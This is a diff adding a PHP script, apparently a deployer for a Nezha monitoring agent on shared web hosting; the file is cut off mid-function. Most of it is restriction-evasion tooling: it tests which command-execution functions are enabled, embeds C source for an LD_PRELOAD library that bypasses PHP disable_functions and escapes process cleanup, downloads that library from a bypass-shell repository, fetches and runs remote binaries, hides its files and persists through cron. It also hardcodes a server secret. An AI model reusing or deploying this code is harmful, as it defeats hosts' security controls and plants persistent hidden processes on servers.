@@ -1,0 +1,2915 @@
+<?php
+// ============================================================
+// 哪吒管理面板 v8.11a — 爆炸根因修复 + 纯 cron 保活版
+// 修复要点（相对 v8.10）：
+//   1. 【关键修复】彻底移除 start.php 自循环机制（爆炸根因）
+//      旧版 enable_keepalive 生成 start.php + _spawn_loop() 派生后台 PHP 循环
+//      → LiteSpeed 下 shell_exec 被禁 + mail+sendmail 触发 → 无限递归 fork sh
+//      → 4 万僵尸进程雪崩
+//      新版：enable_keepalive 只生成 cron_clean.sh，纯 cPanel cron 触发
+//
+//   2. 【新方案】cron_clean.sh 脚本
+//      - 检查 PID 文件 + /proc 验证 agent 是否运行
+//      - 没运行就 setsid 启动（脱离 cron 进程组）
+//      - 同时清理 sendmail 僵尸进程
+//      - 由 cPanel cron 每 5 分钟触发一次
+//
+//   3. 【新方案】10 天访问面板保活
+//      - 用户加一条 cron: 0 0 */10 * * curl 面板URL
+//      - 每 10 天访问面板 → ensureInitFiles() 自动检查 + 启动 agent
+//      - 即使 agent 挂了 10 天也能自动恢复
+//
+//   v8.10 功能保留：ulimit 修复（GODEBUG+GOGC）+ 综合诊断
+//   v8.9 功能保留：UI 调整
+//   v8.8 功能保留：综合诊断 + CF IP 检测
+//   v8.7 功能保留：ensureInitFiles() 一键启动
+//   v8.6 功能保留：Marker 诊断机制
+//   v8.5 功能保留：fork+setsid daemon 模式（bypass.so）
+//   v8.4 功能保留：LiteSpeed setsid 启动逻辑
+//   v8.3 功能保留：文件管理器 + 异步按钮
+//   v8.2 修复保留：进程误判修复
+// ============================================================
+
+@header('Content-Type: text/html; charset=utf-8');
+@set_time_limit(120);
+
+// 【安全】立即清除可能残留的 LD_PRELOAD 环境变量
+// 如果上一次请求因超时/504 没来得及清理，PHP-FPM worker 会残留这个变量
+// 导致后续所有请求都可能触发 .so constructor → 各种异常
+@putenv("LD_PRELOAD=");
+@putenv("NZ_BYPASS_CMD=");
+
+// ===== 唯一配置区 =====
+$NZ_SERVER   = 'nz.zxydk1715.dpdns.org:443';
+$NZ_TLS      = 'true';
+$NZ_SECRET   = 'BFbvpxSlBTUugp3gDzezVKkZ22BV0CeL';
+
+// ===== 目录和文件路径（全部集中到 .stfp 隐藏目录） =====
+// v8.0: 所有生成文件统一放到 PHP 同目录的 .stfp/ 子目录中，避免污染主目录
+//       同时支持 4 小时自愈保活 cron，即使 .stfp/ 内所有文件被删也能恢复
+$SCRIPT_DIR  = dirname(__FILE__);
+$STFP_DIR    = $SCRIPT_DIR . '/.stfp';
+// 自动创建 .stfp 目录（如已存在则跳过）
+if (!is_dir($STFP_DIR)) { @mkdir($STFP_DIR, 0755, true); @chmod($STFP_DIR, 0755); }
+// 不在 .stfp/ 内单独放 .htaccess（主目录 .htaccess 已用 RewriteRule 阻止 .stfp 访问，避免生成两份）
+$AGENT       = $STFP_DIR . '/.nezha_agent';
+$CONFIG      = $STFP_DIR . '/.nezha_config';
+$UUIDFILE    = $STFP_DIR . '/.nezha_uuid';
+$PIDFILE     = $STFP_DIR . '/.nezha_pid';
+$LOGFILE     = $STFP_DIR . '/.nezha_log';
+$RUNSH       = $STFP_DIR . '/run.sh';
+$HTACCESS    = $SCRIPT_DIR . '/.htaccess';   // .htaccess 必须放在 PHP 同目录才生效
+// bypass.so 文件名：优先用 nezha_bypass.so（非隐藏，cPanel 兼容）
+// 同时识别旧的 .nezha_bypass.so 隐藏版（向后兼容旧版本生成的文件）
+$BYPASS_SO   = file_exists($STFP_DIR . '/nezha_bypass.so') ? $STFP_DIR . '/nezha_bypass.so'
+             : (file_exists($STFP_DIR . '/.nezha_bypass.so') ? $STFP_DIR . '/.nezha_bypass.so'
+             : (file_exists($SCRIPT_DIR . '/nezha_bypass.so') ? $SCRIPT_DIR . '/nezha_bypass.so'  // 旧版残留迁移识别
+             : $STFP_DIR . '/nezha_bypass.so'));   // 默认放到 .stfp 内、非隐藏名
+$CMDFILE     = $STFP_DIR . '/.nezha_cmd.sh';       // 待执行命令临时文件
+// 旧版残留路径（用于 cleanup 时清理）
+$LEGACY_FILES = [
+    $SCRIPT_DIR . '/.nezha_agent', $SCRIPT_DIR . '/.nezha_config', $SCRIPT_DIR . '/.nezha_uuid',
+    $SCRIPT_DIR . '/.nezha_pid',   $SCRIPT_DIR . '/.nezha_log',   $SCRIPT_DIR . '/.nezha_cmd.sh',
+    $SCRIPT_DIR . '/nezha_bypass.so', $SCRIPT_DIR . '/.nezha_bypass.so', $SCRIPT_DIR . '/nezha_bypass.so.c',
+    $SCRIPT_DIR . '/.nezha_bypass.so.c', $SCRIPT_DIR . '/run.sh', $SCRIPT_DIR . '/.nezha_download.zip',
+];
+
+// ===== 基于当前 IP 临时生成 UUID =====
+function computeUUIDByIP() {
+    $ip = '';
+    $ip = @gethostbyname(gethostname());
+    if ($ip === gethostname()) $ip = '';
+    if (empty($ip) && isset($_SERVER['SERVER_ADDR'])) $ip = $_SERVER['SERVER_ADDR'];
+    if (empty($ip) && function_exists('curl_init')) {
+        $ch = @curl_init('https://ifconfig.me');
+        @curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_TIMEOUT=>5, CURLOPT_USERAGENT=>'curl']);
+        $r = @curl_exec($ch); @curl_close($ch);
+        if ($r && filter_var(trim($r), FILTER_VALIDATE_IP)) $ip = trim($r);
+    }
+    if (empty($ip)) $ip = '127.0.0.1';
+    $h = md5('nezha-' . $ip);
+    $uuid = substr($h,0,8).'-'.substr($h,8,4).'-4'.substr($h,13,3).'-'.substr($h,16,4).'-'.substr($h,20,12);
+    return ['ip'=>$ip, 'uuid'=>$uuid];
+}
+
+// ===== 稳定 UUID 获取 =====
+function getStableUUID($uuidfile, $configfile) {
+    if (file_exists($uuidfile)) {
+        $u = trim(@file_get_contents($uuidfile));
+        if (preg_match('/^[0-9a-fA-F-]{36}$/', $u)) return $u;
+    }
+    if (file_exists($configfile)) {
+        $old = @file_get_contents($configfile);
+        if (preg_match('/^uuid:\s*"?([0-9a-fA-F-]{36})"?/m', $old, $m)) {
+            @file_put_contents($uuidfile, $m[1]);
+            @chmod($uuidfile, 0600);
+            return $m[1];
+        }
+    }
+    $info = computeUUIDByIP();
+    @file_put_contents($uuidfile, $info['uuid']);
+    @chmod($uuidfile, 0600);
+    return $info['uuid'];
+}
+
+$uuid_info = computeUUIDByIP();
+$NZ_IP      = $uuid_info['ip'];
+$NZ_UUID    = getStableUUID($UUIDFILE, $CONFIG);
+$NZ_UUID_IP = $uuid_info['ip'];
+
+// ================================================================
+//  一、深度函数检测（含绕过函数）
+// ================================================================
+
+function deepTestAll() {
+    $R = [];
+
+    // --- 命令执行类 ---
+    $exec_fns = [
+        'proc_open'   => '进程打开(核心)',
+        'popen'       => '管道打开',
+        'exec'        => 'exec执行',
+        'shell_exec'  => 'shell执行',
+        'system'      => 'system执行',
+        'passthru'    => 'passthru执行',
+        'pcntl_exec'  => 'pcntl执行',
+    ];
+    foreach ($exec_fns as $fn => $desc) {
+        $R[$fn] = ['desc'=>$desc, 'exists'=>function_exists($fn), 'works'=>false, 'detail'=>''];
+        if (!$R[$fn]['exists']) { $R[$fn]['detail'] = '函数不存在/被禁'; continue; }
+        if ($fn === 'pcntl_exec') { $R[$fn]['detail'] = '危险函数，仅检测可用性'; continue; }
+
+        if ($fn === 'proc_open') {
+            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
+            $p = @proc_open('echo PROC_OK 2>&1', $d, $pipes);
+            if (is_resource($p)) {
+                fclose($pipes[0]); $out = stream_get_contents($pipes[1]); $err = stream_get_contents($pipes[2]);
+                fclose($pipes[1]); fclose($pipes[2]); $code = proc_close($p);
+                $R[$fn]['works'] = (strpos($out,'PROC_OK')!==false);
+                $R[$fn]['detail'] = "code=$code out=".trim($out);
+            } else { $R[$fn]['detail'] = 'proc_open返回非资源'; }
+        } elseif ($fn === 'popen') {
+            $fp = @popen('echo POP_OK 2>&1','r');
+            if ($fp) { $out = fread($fp,4096); $c = pclose($fp); $R[$fn]['works']=(strpos($out,'POP_OK')!==false); $R[$fn]['detail']="code=$c out=".trim($out); }
+            else { $R[$fn]['detail'] = 'popen返回空'; }
+        } elseif ($fn === 'exec') {
+            $lines=[]; $c=-1; @exec('echo EXEC_OK 2>&1',$lines,$c); $R[$fn]['works']=($c===0&&!empty($lines)); $R[$fn]['detail']="code=$c out=".implode('',$lines);
+        } elseif ($fn === 'shell_exec') {
+            $out = @shell_exec('echo SH_OK 2>&1'); $R[$fn]['works']=(strpos($out,'SH_OK')!==false); $R[$fn]['detail']=$out?trim($out):'(empty)';
+        } elseif ($fn === 'system') {
+            ob_start(); $c=-1; @system('echo SYS_OK 2>&1',$c); $out=ob_get_clean(); $R[$fn]['works']=(strpos($out,'SYS_OK')!==false); $R[$fn]['detail']="code=$c out=".trim($out);
+        } elseif ($fn === 'passthru') {
+            ob_start(); @passthru('echo PAS_OK 2>&1',$c); $out=ob_get_clean(); $R[$fn]['works']=(strpos($out,'PAS_OK')!==false); $R[$fn]['detail']="code=$c out=".trim($out);
+        }
+    }
+
+    // --- POSIX 类 ---
+    $R['posix_kill'] = ['desc'=>'POSIX杀进程', 'exists'=>function_exists('posix_kill'), 'works'=>false, 'detail'=>''];
+    if ($R['posix_kill']['exists']) { $R['posix_kill']['works']=true; $R['posix_kill']['detail']='可用'; }
+    $R['posix_getpwuid'] = ['desc'=>'POSIX用户信息', 'exists'=>function_exists('posix_getpwuid'), 'works'=>false, 'detail'=>''];
+    if ($R['posix_getpwuid']['exists']) { $pw=@posix_getpwuid(posix_getuid()); $R['posix_getpwuid']['works']=!empty($pw); $R['posix_getpwuid']['detail']=!empty($pw)?"user={$pw['name']}":'失败'; }
+
+    // --- 网络类 ---
+    $R['curl_init'] = ['desc'=>'CURL初始化', 'exists'=>function_exists('curl_init'), 'works'=>false, 'detail'=>''];
+    if ($R['curl_init']['exists']) {
+        $ch=@curl_init('https://ifconfig.me');
+        if ($ch) { @curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>1,CURLOPT_TIMEOUT=>5,CURLOPT_USERAGENT=>'curl']); $o=@curl_exec($ch); $c=@curl_getinfo($ch,CURLINFO_HTTP_CODE); $e=@curl_error($ch); @curl_close($ch); $R['curl_init']['works']=($o!==false); $R['curl_init']['detail']="http=$c".($e?" err=$e":' OK'); }
+    }
+    $R['curl_exec'] = ['desc'=>'CURL执行', 'exists'=>function_exists('curl_exec'), 'works'=>$R['curl_init']['works'], 'detail'=>'跟随curl_init'];
+    $R['fsockopen'] = ['desc'=>'Socket连接', 'exists'=>function_exists('fsockopen'), 'works'=>false, 'detail'=>''];
+    if ($R['fsockopen']['exists']) { $fp=@fsockopen('tcp://github.com',443,$en,$es,3); $R['fsockopen']['works']=($fp!==false); $R['fsockopen']['detail']=$fp?'OK':"err=$en $es"; if($fp) fclose($fp); }
+
+    // --- 文件类 ---
+    $R['file_put_contents'] = ['desc'=>'写文件', 'exists'=>function_exists('file_put_contents'), 'works'=>false, 'detail'=>''];
+    $R['file_get_contents'] = ['desc'=>'读文件', 'exists'=>function_exists('file_get_contents'), 'works'=>false, 'detail'=>''];
+    $R['chmod']  = ['desc'=>'改权限', 'exists'=>function_exists('chmod'), 'works'=>false, 'detail'=>''];
+    $R['mkdir']  = ['desc'=>'建目录', 'exists'=>function_exists('mkdir'), 'works'=>false, 'detail'=>''];
+    $R['unlink'] = ['desc'=>'删文件', 'exists'=>function_exists('unlink'), 'works'=>false, 'detail'=>''];
+    $R['ZipArchive'] = ['desc'=>'ZIP解压(类)', 'exists'=>class_exists('ZipArchive'), 'works'=>false, 'detail'=>''];
+    $tf = sys_get_temp_dir().'/nz_t_'.getmypid();
+    if (@file_put_contents($tf,'t')!==false) {
+        $R['file_put_contents']['works']=true; $R['file_put_contents']['detail']='OK';
+        $c=@file_get_contents($tf); $R['file_get_contents']['works']=($c==='t'); $R['file_get_contents']['detail']=$c==='t'?'OK':'内容不匹配';
+        @chmod($tf,0755); $R['chmod']['works']=(@fileperms($tf)&0100)!==0; $R['chmod']['detail']=$R['chmod']['works']?'OK':'失败';
+        @unlink($tf); $R['unlink']['works']=!file_exists($tf); $R['unlink']['detail']=$R['unlink']['works']?'OK':'失败';
+    } else { $R['file_put_contents']['detail']='写入失败'; }
+    @mkdir($tf.'_d',0755); $R['mkdir']['works']=is_dir($tf.'_d'); $R['mkdir']['detail']=$R['mkdir']['works']?'OK':'失败'; @rmdir($tf.'_d');
+    if ($R['ZipArchive']['exists']) { $R['ZipArchive']['works']=true; $R['ZipArchive']['detail']='ZipArchive 类可用'; }
+    $R['session_start'] = ['desc'=>'Session', 'exists'=>function_exists('session_start'), 'works'=>false, 'detail'=>'仅检测可用性'];
+
+    // ========================================================
+    // 【新增】绕过函数检测
+    // ========================================================
+    $R['putenv'] = ['desc'=>'设环境变量(绕过核心)', 'exists'=>function_exists('putenv'), 'works'=>false, 'detail'=>''];
+    if ($R['putenv']['exists']) {
+        $test_val = 'NZ_TEST_' . mt_rand();
+        @putenv("{$test_val}=1");
+        $got = getenv($test_val);
+        $R['putenv']['works'] = ($got === '1');
+        $R['putenv']['detail'] = $R['putenv']['works'] ? 'OK - 环境变量设置成功' : 'putenv 存在但设置失败';
+        @putenv("{$test_val}=");
+    }
+    $R['mail'] = ['desc'=>'mail函数(绕过触发器)', 'exists'=>function_exists('mail'), 'works'=>false, 'detail'=>''];
+    if ($R['mail']['exists']) {
+        // v8.11a: 不调 mail()，避免 fork sh 僵尸
+        $R['mail']['works'] = true;
+        $R['mail']['detail'] = "sendmail_path=" . @ini_get('sendmail_path');
+        if ($old) @ini_set('sendmail_path', $old);
+    }
+    $R['error_log'] = ['desc'=>'error_log(备选触发器)', 'exists'=>function_exists('error_log'), 'works'=>false, 'detail'=>''];
+    if ($R['error_log']['exists']) { $R['error_log']['works'] = true; $R['error_log']['detail'] = '可用'; }
+    $R['ini_set'] = ['desc'=>'ini_set(配置修改)', 'exists'=>function_exists('ini_set'), 'works'=>false, 'detail'=>''];
+    if ($R['ini_set']['exists']) {
+        $old = @ini_get('display_errors');
+        $r = @ini_set('display_errors', $old);
+        $R['ini_set']['works'] = ($r !== false || $old === $r);
+        $R['ini_set']['detail'] = $R['ini_set']['works'] ? 'OK' : 'ini_set 受限';
+    }
+
+    return $R;
+}
+
+$FUNC = deepTestAll();
+$DISABLE_LIST = @ini_get('disable_functions') ?: '';
+
+// ================================================================
+//  二、确定可用的执行方式（降级链 + LD_PRELOAD 绕过）
+// ================================================================
+
+$EXEC_METHODS = [];
+foreach (['proc_open','popen','exec','shell_exec','system','passthru'] as $m) {
+    if (!empty($FUNC[$m]['works'])) $EXEC_METHODS[] = $m;
+}
+
+$LD_PRELOAD_AVAILABLE = false;
+$LD_PRELOAD_DETAIL = '';
+if (!empty($FUNC['putenv']['works']) && (!empty($FUNC['mail']['works']) || !empty($FUNC['error_log']['works']))) {
+    $LD_PRELOAD_AVAILABLE = true;
+    $LD_PRELOAD_DETAIL = 'putenv+' . (!empty($FUNC['mail']['works']) ? 'mail' : 'error_log') . ' 可用';
+} else {
+    $reasons = [];
+    if (empty($FUNC['putenv']['works'])) $reasons[] = 'putenv不可用';
+    if (empty($FUNC['mail']['works']) && empty($FUNC['error_log']['works'])) $reasons[] = 'mail和error_log均不可用';
+    $LD_PRELOAD_DETAIL = '不可用: ' . implode('; ', $reasons);
+}
+
+$BEST_EXEC = !empty($EXEC_METHODS) ? $EXEC_METHODS[0] : ($LD_PRELOAD_AVAILABLE ? 'ld_preload' : 'none');
+$CAN_EXEC  = ($BEST_EXEC !== 'none');
+
+// ================================================================
+//  三、LD_PRELOAD 绕过引擎
+// ================================================================
+
+function generateBypassCSource() {
+    return <<<'C'
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+
+/* v8.5 bypass.so - 适配 LiteSpeed + 严格 disable_functions 环境
+ *
+ * 关键改进：
+ *   1. constructor 自己 fork + setsid，不依赖外部 setsid 命令
+ *      → 解决 LiteSpeed 请求结束杀整个进程组的问题
+ *      → 解决 posix_setsid 被 disable_functions 禁的问题（libc 函数不受影响）
+ *   2. 子进程重定向 stdin/stdout/stderr 到 /dev/null 或日志文件
+ *      → 完全脱离 PHP 的文件描述符
+ *   3. 父进程立即返回，不等待子进程（不阻塞 mail()）
+ *   4. 支持两种模式：
+ *      - 长驻模式（NZ_DAEMON=1）：fork + setsid + exec，agent 永久脱离
+ *      - 普通模式：fork + system，命令执行完子进程退出
+ */
+
+__attribute__((constructor))
+void nezha_bypass(void) {
+    const char *cmdfile = getenv("NZ_BYPASS_CMD");
+    if (!cmdfile || access(cmdfile, R_OK) != 0) return;
+
+    FILE *f = fopen(cmdfile, "r");
+    if (!f) return;
+    char cmd[8192] = {0};
+    if (!fgets(cmd, sizeof(cmd)-1, f)) {
+        fclose(f);
+        return;
+    }
+    fclose(f);
+    cmd[strcspn(cmd, "\n")] = 0;
+    if (strlen(cmd) == 0) return;
+
+    /* 清理环境变量，防止子进程再次触发 */
+    unsetenv("LD_PRELOAD");
+    unsetenv("NZ_BYPASS_CMD");
+
+    const char *daemon_mode = getenv("NZ_DAEMON");
+
+    /* 第一次 fork：让 child 成为孤儿进程，被 init 接管 */
+    pid_t pid = fork();
+    if (pid < 0) {
+        /* fork 失败，fallback 直接 system（会阻塞 mail，但至少能跑） */
+        system(cmd);
+        return;
+    }
+    if (pid > 0) {
+        /* parent：不等子进程，立即返回（避免阻塞 mail） */
+        waitpid(pid, NULL, WNOHANG);
+        return;
+    }
+
+    /* === child 进程 === */
+    /* 创建新 session，脱离控制终端和进程组（关键！绕过 LiteSpeed 进程清理） */
+    setsid();
+
+    /* 忽略 SIGHUP（session leader 终止时不会发 SIGHUP 给我们） */
+    signal(SIGHUP, SIG_IGN);
+
+    /* 第二次 fork：彻底成为 daemon，不再是 session leader，永远不会再获取控制终端 */
+    if (daemon_mode != NULL) {
+        pid_t pid2 = fork();
+        if (pid2 < 0) {
+            /* 失败也继续，单 fork 已经够用 */
+        } else if (pid2 > 0) {
+            /* 中间进程退出 */
+            _exit(0);
+        }
+    }
+
+    /* 重定向 stdin/stdout/stderr 到 /dev/null */
+    int devnull = open("/dev/null", O_RDWR);
+    if (devnull >= 0) {
+        dup2(devnull, 0);
+        dup2(devnull, 1);
+        dup2(devnull, 2);
+        if (devnull > 2) close(devnull);
+    }
+
+    /* 执行命令：用 system() 走 /bin/sh，支持 shell 语法（重定向、管道、&） */
+    int rc = system(cmd);
+
+    /* 子进程退出 */
+    _exit(WIFEXITED(rc) ? WEXITSTATUS(rc) : 1);
+}
+C;
+}
+
+function downloadBypassSo($so_path) {
+    global $FUNC;
+    if (empty($FUNC['curl_init']['works'])) return ['ok'=>false, 'msg'=>'curl 不可用'];
+    // 下载源：用户指定的优先（github.com/1715Yy/vipnezhash），blob URL 自动转 raw URL
+    // github.com/USER/REPO/blob/BRANCH/FILE → raw.githubusercontent.com/USER/REPO/BRANCH/FILE
+    $urls = [
+        'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/nezha_bypass.so',
+        'https://ghgo.xyz/https://raw.githubusercontent.com/1715Yy/vipnezhash/main/nezha_bypass.so',
+        'https://mirror.ghproxy.com/https://raw.githubusercontent.com/1715Yy/vipnezhash/main/nezha_bypass.so',
+        'https://raw.githubusercontent.com/MediceanASLR/Bypass_Disable_Functions_Shell/master/bypass.so',
+    ];
+    $last_err = '';
+    foreach ($urls as $url) {
+        $ch = @curl_init($url); $fp = @fopen($so_path.'.tmp', 'w+');
+        if (!$ch || !$fp) { if($ch) @curl_close($ch); if($fp) @fclose($fp); $last_err = 'curl_init 或 fopen 失败'; continue; }
+        @curl_setopt_array($ch, [CURLOPT_FILE=>$fp, CURLOPT_TIMEOUT=>30, CURLOPT_CONNECTTIMEOUT=>10, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false, CURLOPT_USERAGENT=>'Mozilla/5.0']);
+        $r = @curl_exec($ch); $http = @curl_getinfo($ch, CURLINFO_HTTP_CODE); $err = @curl_error($ch); @curl_close($ch); @fclose($fp);
+        if ($r && $http>=200 && $http<400 && file_exists($so_path.'.tmp') && filesize($so_path.'.tmp')>1000) {
+            @rename($so_path.'.tmp', $so_path); @chmod($so_path, 0600);
+            return ['ok'=>true, 'msg'=>'下载成功 ('.filesize($so_path).' bytes) 来源: '.$url];
+        }
+        @unlink($so_path.'.tmp');
+        $last_err = "[$url] http=$http ".($err?"err=$err":'');
+    }
+    return ['ok'=>false, 'msg'=>'所有下载源均失败。最后错误: '.$last_err];
+}
+
+function compileBypassSo($so_path) {
+    global $EXEC_METHODS;
+    // 没有命令执行能力就不写 .c 文件（避免用户看到自动生成的 .c）
+    if (empty($EXEC_METHODS)) return ['ok'=>false, 'msg'=>'无命令执行能力，无法 gcc 编译'];
+    $c_path = $so_path . '.c'; $c_source = generateBypassCSource();
+    if (@file_put_contents($c_path, $c_source) === false) return ['ok'=>false, 'msg'=>'C 源码写入失败'];
+    $r = runCmd("gcc -shared -fPIC -o ".escapeshellarg($so_path)." ".escapeshellarg($c_path)." -nostartfiles 2>&1");
+    @unlink($c_path);  // 始终清理 .c 临时文件（无论编译成功失败）
+    if (file_exists($so_path) && filesize($so_path) > 1000) { @chmod($so_path, 0600); return ['ok'=>true, 'msg'=>'gcc 编译成功']; }
+    return ['ok'=>false, 'msg'=>'gcc 编译失败: '.$r['output']];
+}
+
+function ensureBypassSo($so_path) {
+    if (file_exists($so_path) && filesize($so_path) > 1000) return ['ok'=>true, 'msg'=>'bypass.so 已存在'];
+    $r = downloadBypassSo($so_path); if ($r['ok']) return $r;
+    $r = compileBypassSo($so_path); if ($r['ok']) return $r;
+    // 下载和编译均失败 → 写 .c 源码让用户本地编译后上传
+    $c_path = $so_path . '.c'; $c_source = generateBypassCSource();
+    @file_put_contents($c_path, $c_source);
+    return ['ok'=>false, 'msg'=>"下载和编译均失败，C 源码已写入: $c_path\n本地编译命令: gcc -shared -fPIC -o $so_path $c_path -nostartfiles\n编译后请上传 .so 到 .stfp/ 目录"];
+}
+
+function ldPreloadExec($cmd, $so_path, $cmdfile, $daemon = false) {
+    global $FUNC, $LOGFILE;
+    if (empty($FUNC['putenv']['works'])) return ['output'=>'', 'code'=>-1, 'method'=>'ld_preload', 'error'=>'putenv不可用', 'so_loaded'=>false];
+    if (empty($FUNC['mail']['works']) && empty($FUNC['error_log']['works'])) return ['output'=>'', 'code'=>-1, 'method'=>'ld_preload', 'error'=>'mail和error_log均不可用', 'so_loaded'=>false];
+    if (!file_exists($so_path) || filesize($so_path) < 1000) return ['output'=>'', 'code'=>-1, 'method'=>'ld_preload', 'error'=>'bypass.so不存在', 'so_loaded'=>false];
+
+    // v8.6：marker 机制 - 让 bypass.so 写一个标记文件，PHP 检测它是否存在
+    // 这样能明确判断 .so 是否真的被加载
+    $marker = dirname($cmdfile) . '/.nezha_marker_' . time() . '_' . mt_rand(1000, 9999);
+    @unlink($marker);  // 清理可能残留的 marker
+
+    // 1. 将命令写入文件
+    @file_put_contents($cmdfile, $cmd . "\n"); @chmod($cmdfile, 0600);
+
+    // 2. 设置环境变量
+    @putenv("NZ_BYPASS_CMD=" . $cmdfile);
+    @putenv("LD_PRELOAD=" . $so_path);
+    @putenv("NZ_MARKER=" . $marker);
+    @putenv("NZ_LOGFILE=" . $LOGFILE);  // v8.6: bypass.so 写日志到主日志文件
+    if ($daemon) {
+        @putenv("NZ_DAEMON=1");
+    } else {
+        @putenv("NZ_DAEMON=");
+    }
+
+    // 3. 触发子进程
+    $trigger = '';
+    $mail_fork_happened = false;
+    if (!empty($FUNC['mail']['works'])) {
+        // v8.11a: 不调 mail()（这台主机 LD_PRELOAD 不工作，调 mail 只会产生僵尸 sh）
+        $trigger = 'mail(disabled)';
+        // 给 fork 一点时间
+        usleep(200000);  // 0.2 秒
+        // 检查 marker
+        $mail_fork_happened = file_exists($marker);
+    } elseif (!empty($FUNC['error_log']['works'])) {
+        @error_log("x", 1, "a@b.com", "");
+        $trigger = 'error_log';
+        usleep(200000);
+        $mail_fork_happened = file_exists($marker);
+    }
+
+    // 4. 检查 marker（再等一会儿，确保 .so 有时间写）
+    if (!$mail_fork_happened) {
+        usleep(500000);  // 再等 0.5 秒
+        $mail_fork_happened = file_exists($marker);
+    }
+    $so_loaded = $mail_fork_happened;
+    if ($so_loaded) {
+        @unlink($marker);
+    }
+
+    // 5. 立即清理环境变量
+    @putenv("LD_PRELOAD=");
+    @putenv("NZ_BYPASS_CMD=");
+    @putenv("NZ_DAEMON=");
+    @putenv("NZ_MARKER=");
+    @putenv("NZ_LOGFILE=");
+    @unlink($cmdfile);
+    if (file_exists($marker)) @unlink($marker);
+
+    return ['output'=>'', 'code'=>$so_loaded?0:-1, 'method'=>'ld_preload('.$trigger.($daemon?'+daemon':'').')', 'so_loaded'=>$so_loaded];
+}
+
+// ================================================================
+//  四、通用命令执行（自动降级 + LD_PRELOAD 兜底）
+// ================================================================
+
+function runCmd($cmd, $timeout=30) {
+    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE;
+    $output=''; $code=-1; $used='none';
+
+    foreach ($EXEC_METHODS as $m) {
+        if ($m === 'proc_open') {
+            $d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
+            $p=@proc_open($cmd,$d,$pipes);
+            if (is_resource($p)) {
+                fclose($pipes[0]); $stdout=stream_get_contents($pipes[1]); $stderr=stream_get_contents($pipes[2]);
+                fclose($pipes[1]); fclose($pipes[2]); $code=proc_close($p);
+                $output=$stdout.($stderr?"\n[stderr] $stderr":''); $used='proc_open'; break;
+            }
+        } elseif ($m === 'popen') {
+            $fp=@popen($cmd.' 2>&1','r');
+            if ($fp) { $output=''; while(!feof($fp)) $output.=fread($fp,4096); $code=pclose($fp); $used='popen'; break; }
+        } elseif ($m === 'exec') {
+            $lines=[]; @exec($cmd." 2>&1",$lines,$code); $output=implode("\n",$lines); $used='exec'; break;
+        } elseif ($m === 'shell_exec') {
+            $output=@shell_exec($cmd." 2>&1"); $code=$output?0:1; $used='shell_exec'; break;
+        } elseif ($m === 'system') {
+            ob_start(); @system($cmd." 2>&1",$code); $output=ob_get_clean(); $used='system'; break;
+        } elseif ($m === 'passthru') {
+            ob_start(); @passthru($cmd." 2>&1",$code); $output=ob_get_clean(); $used='passthru'; break;
+        }
+    }
+
+    // LD_PRELOAD 兜底
+    if ($used === 'none' && $LD_PRELOAD_AVAILABLE) {
+        $r = ldPreloadExec($cmd, $BYPASS_SO, $CMDFILE);
+        if (!empty($r['method']) && $r['method'] === 'ld_preload') {
+            $output = $r['output']; $code = $r['code']; $used = 'ld_preload';
+        }
+    }
+
+    return ['output'=>trim($output), 'code'=>$code, 'method'=>$used];
+}
+
+// ================================================================
+//  五、下载二进制
+// ================================================================
+
+function downloadBinary($script_dir, $arch='amd64') {
+    global $EXEC_METHODS, $FUNC;
+    $agent = "$script_dir/.nezha_agent"; $zip = "$script_dir/.nezha_download.zip"; $log = [];
+    $urls = [
+        "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{$arch}.zip",
+        "https://ghgo.xyz/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{$arch}.zip",
+        "https://mirror.ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{$arch}.zip",
+    ];
+    $downloaded = false;
+    if (!$downloaded && !empty($FUNC['curl_init']['works'])) {
+        foreach ($urls as $url) {
+            $log[] = "[PHP curl] 尝试: $url";
+            $ch = @curl_init($url); $fp = @fopen($zip, 'w+');
+            if (!$ch || !$fp) { if($ch) curl_close($ch); if($fp) fclose($fp); continue; }
+            @curl_setopt_array($ch, [CURLOPT_FILE=>$fp, CURLOPT_TIMEOUT=>120, CURLOPT_CONNECTTIMEOUT=>15, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false, CURLOPT_USERAGENT=>'Mozilla/5.0']);
+            $r = @curl_exec($ch); $http = @curl_getinfo($ch, CURLINFO_HTTP_CODE); @curl_close($ch); @fclose($fp);
+            if ($r && $http>=200 && $http<400 && file_exists($zip) && filesize($zip)>100000) { $downloaded = true; $log[] = "[PHP curl] 成功"; break; }
+            @unlink($zip); $log[] = "[PHP curl] 失败";
+        }
+    }
+    if (!$downloaded && !empty($EXEC_METHODS)) {
+        foreach ($urls as $url) {
+            $log[] = "[shell curl] $url"; $r = runCmd("curl -sSL '$url' -o '$zip' --connect-timeout 15 --max-time 120 2>&1");
+            if (file_exists($zip) && filesize($zip)>100000) { $downloaded = true; $log[] = "[shell curl] 成功"; break; }
+            @unlink($zip); $log[] = "[shell curl] 失败";
+        }
+    }
+    if (!$downloaded) return ['ok'=>false, 'msg'=>"下载失败\n".implode("\n",$log)];
+
+    $extracted = false;
+    if (!$extracted && !empty($FUNC['ZipArchive']['works'])) {
+        $log[] = "[ZipArchive] 解压..."; $za = new ZipArchive();
+        if ($za->open($zip) === true) {
+            for ($i=0; $i<$za->numFiles; $i++) { $name = $za->getNameIndex($i);
+                if (strpos(basename($name), 'nezha-agent') === 0) { $fp = $za->getStream($name);
+                    if ($fp) { $out = fopen($agent, 'w'); while (!feof($fp)) fwrite($out, fread($fp, 8192)); fclose($out); fclose($fp); $extracted = true; } } }
+            $za->close();
+        }
+        $log[] = $extracted ? '[ZipArchive] 成功' : '[ZipArchive] 失败';
+    }
+    if (!$extracted && !empty($EXEC_METHODS)) {
